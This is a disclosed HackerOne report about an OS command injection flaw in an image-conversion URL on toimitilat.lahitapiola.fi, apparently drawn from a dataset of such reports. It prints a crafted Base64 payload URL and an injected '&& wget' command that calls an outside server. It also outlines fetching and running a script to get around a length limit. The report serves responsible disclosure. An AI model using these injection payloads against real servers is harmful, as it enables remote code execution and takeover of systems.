---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '303061'
original_report_id: '303061'
title: RCE using bash command injection on /system/images (toimitilat.lahitapiola.fi)
weakness: OS Command Injection
team_handle: localtapiola
created_at: '2018-01-07T17:29:46.126Z'
disclosed_at: '2018-02-27T11:29:45.636Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 209
asset_identifier: toimitilat.lahitapiola.fi
asset_type: URL
max_severity: none
tags:
- hackerone
- os-command-injection
---

# RCE using bash command injection on /system/images (toimitilat.lahitapiola.fi)

## Metadata

- HackerOne Report ID: 303061
- Weakness: OS Command Injection
- Program: localtapiola
- Disclosed At: 2018-02-27T11:29:45.636Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:** 
the "/system/images" URL accepts a Base-64 encoded string, which is in turn used to convert images from the local disk before displaying them to the user. The website fails to validate the user input, allowing arbitrary bash command injection.

**Description:** 
When surfing the toimitilat.lahitapiola.fi domain, an attacker may encounter URLs like ```https://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJIMj█████████ZW5rYXR1XzFfanVsa2lzaXZ1M19MVF93LmpwZwY6BkVUWwk6B████ZlcnRJIiktc3RyaXAgLWludGVybGFjZSBQbGFuZSAtcXVhbGl0eSA4MCUGOwZU███TAyeAY7BlQ/00100_Kaisaniemenkatu_1_julkisivu3_LT_w.jpg```

The latter part is unnecessary, and the Base64 encoded string resolves to (with some non displayable characters).
```[[:fI"H2017/12/01/08_34_36_493_00100_Kaisaniemenkatu_1_julkisivu3_LT_w.jpg:ET[	:p:convertI")-strip -interlace Plane -quality 80%;T0[;:
thumbI"	102x;```.

The 36 characters from after ' convertI") ' until after the '80%' can be manipulated as the attacker wishes (padded by spaces to be exactly 36 characters), used to change the parameters injected to "convert" (by imagemagick, a library with multiple known vulnerabilities), and even inject arbitrary bash commands. e.g.
```https://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJEMjAxNy8xMi8xNC8xNl████████aXNpdnVfbHQuanBnB████████GcDoMY29udmVydEkiKSAmJiB3Z2V0IGh0dHA6Ly8y█████████jkuMjU1L2QuaHRtbAY7BlQwWwg7BzoKdGh1bWJJIgkxMDB4AAAAAAAAAAAA ```

(Injected command ``` && wget http://████████/d.html```).
This results in a 500 Error, as the server cannot return the image, but the action is performed as can be seen by attached PoC picture.

The 36 character limit poses limits on the attacker being able to exfiltrate data, which can probably be bypassed by creating a short runnable script in the running directory, (or downloading it from the internet using wget), then running it. I had started working towards a larger PoC (such as the /etc/passwd contents or equal), but have run out of time for today, hence reporting this with the "wget" PoC as this is quite a critical vulnerability, and it shouldn't wait until tomorrow. (This is an acceptable PoC for Remote Code Execution, as seen on HackerOne)

Please, feel free to ask additional questions, or consult about possible solutions.

**Domain:** 
toimitilat.lahitapiola.fi

## Browsers / Apps Verified In:
N/A

## Steps To Reproduce:

(Add details for how we can reproduce the issue)

  1. Issue a request like ```https://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJEMjAxNy8xMi8xNC8xNl███aXNpdnVfbHQuanBnB███████GcDoMY29udmVydEkiKSAmJiB3Z2V0IGh0dHA6Ly8y██████jkuMjU1L2QuaHRtbAY7BlQwWwg7BzoKdGh1bWJJIgkxMDB4AAAAAAAAAAAA```
replacing my server's IP with an internet facing server under your control.
  2. See the issued request.

## Additional material

  * Screenshots: 
1."Empty WGET". - A simple, empty WGET request to my server.
2."d.html" WGET - A WGET request to my server, downloading a file named d.html successfuly
3. Working folder disclosure through "comment" flag injection

## Related reports, best practices
https://www.cvedetails.com/vulnerability-list/vendor_id-1749/Imagemagick.html
https://www.owasp.org/index.php/OS_Command_Injection_Defense_Cheat_Sheet
https://www.owasp.org/index.php/Injection_Prevention_Cheat_Sheet

## Impact

This can lead to the attacker controlling the Tapiola server, altering its contents, using it as part of a botnet etc.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
